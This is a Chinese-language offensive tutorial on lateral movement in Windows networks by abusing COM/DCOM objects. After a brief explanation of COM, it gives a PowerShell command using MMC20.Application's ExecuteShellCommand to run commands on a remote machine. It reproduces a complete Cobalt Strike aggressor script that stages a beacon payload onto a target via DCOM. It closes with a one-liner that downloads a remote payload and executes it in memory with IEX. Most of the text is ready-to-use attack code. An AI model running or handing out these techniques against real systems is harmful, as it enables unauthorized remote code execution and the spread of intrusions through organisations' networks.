### 内网横向系列 —— 利用COM对象

#### 0x01 什么是COM对象

微软组件对象模型（Component Object Model，COM）是平台无关、分布式、面向对象的一种系统，可以用来创建可交互的二进制软件组件”。COM是微软OLE（复合文档）、ActiveX（互联网支持组件）以及其他组件的技术基础，COM允许对象跨进程和计算机边界进行交互。COM的核心是一组组件对象间交互的规范，定义了组件对象如何与其用户通过二进制接口标准进行交互，COM的接口是组件的类型纽带。COM还提供定位服务的实现，可以根据Windows系统注册表，从一个类标识（CLSID）来确定COM组件的位置（也可使用程序标识符（ProgID）是标识一个COM，但精度较低，因为不能保证它是全局唯一的），**可以用CLSID实例化每个对象，然后枚举每个COM对象公开的方法和属性**。一个COM组件可以实现多个COM对象，每个COM对象实现多个COM接口，DLL或者EXE作为COM组件的实现的容器。COM采用自己的IDL来描述组件的接口（interface），支持多接口，解决版本兼容问题。COM为所有组件定义了一个共同的父接口IUnknown。GUID 是一个 128 位整数（16 字节），COM将其用于计算机和网络的唯一标识符。



#### 0x02 枚举COM对象



`Get-ChildItem -Path HKCR:\CLSID -Name | Select -Skip 1`

根据CLSID获取COM对象的属性和方法

```
PS C:\Users\Administrator\Desktop> $handle = [activator]::CreateInstance([type]::GetTypeFromCLSID("{00000305-0000-0000-C000-000000000046}"))
PS C:\Users\Administrator\Desktop> $handle | Get-Member
```

![](/Users/cate4cafe/工作/文章/com对象横向移动/media/1.png)



#### 0x03 利用MMC20.Application横向移动

MMC应用程序类（MMC20.Application），这个COM对象允许使用脚本来处理MMC管理单元组件，它的[ExecuteShellCommand](https://docs.microsoft.com/zh-cn/previous-versions/windows/desktop/mmc/view-executeshellcommand?redirectedfrom=MSDN)属性可以执行远程命令。前提是当前上下文拥有远程计算机的权限（如域管）且远程计算机的防火墙过关闭。

```
[activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","192.168.145.11")).Document.ActiveView.ExecuteShellCommand("C:\\windows\\system32\\cmd.exe", $null,"/c calc.exe","7")
```

![](/Users/cate4cafe/工作/文章/com对象横向移动/media/2.png)



CNA利用脚本

```python
# Lateral Movement alias
# https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/

# register help for our alias
beacon_command_register("com-exec", "lateral movement with DCOM",
	"Synopsis: com-exec [target] [listener]\n\n" .
	"Run a payload on a target via DCOM MMC20.Application Object");

# here's our alias to collect our arguments
alias com-exec {
	if ($3 is $null) {
		# let the user choose a listener
		openPayloadHelper(lambda({
			com_exec_go($bid, $target, $1);
		}, $bid => $1, $target => $2));
	}
	else {
		# we have the needed arguments, pass them
		com_exec_go($1, $2, $3);
	}
}

# this is the implementation of the attack
sub com_exec_go {
	local('$command $script $oneliner');

	# check if our listener exists
	if (listener_info($3) is $null) {
		berror($1, "Listener $3 does not exist");
		return;
	}

	# state what we're doing.
	btask($1, "Tasked Beacon to jump to $2 (" . listener_describe($3, $2) . ") via DCOM");

	# generate a PowerShell one-liner to run our alias	
	$command = powershell($3, true, "x86");

	# remove "powershell.exe " from our command
	$command = strrep($command, "powershell.exe ", "");

	# build script that uses DCOM to invoke ExecuteShellCommand on MMC20.Application object
	$script  = '[activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "';
	$script .= $2;
	$script .=  '")).Document.ActiveView.ExecuteShellCommand("';
	$script .= 'c:\windows\system32\WindowsPowerShell\v1.0\powershell.exe';
	$script .= '", $null, "';
	$script .= $command;
	$script .= '", "7")';

	# run the script we built up
	bpowershell!($1, $script);
	
	# complete staging process (for bind_pipe listeners)
	bstage($1, $2, $3);
}
```

此外，也可以利用[ShellWindows](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)进行横向移动

#### 0x04 其他com对象利用

内存加载执行

```
[activator]::CreateInstance([type]::GetTypeFromCLSID("F5078F35-C551-11D3-89B9-0000F81FE221")); $o.Open("GET", "http://127.0.0.1/payload", $False); $o.Send(); IEX $o.responseText;
```

以及这篇[博客](https://www.cybereason.com/blog/dcom-lateral-movement-techniques)提到的。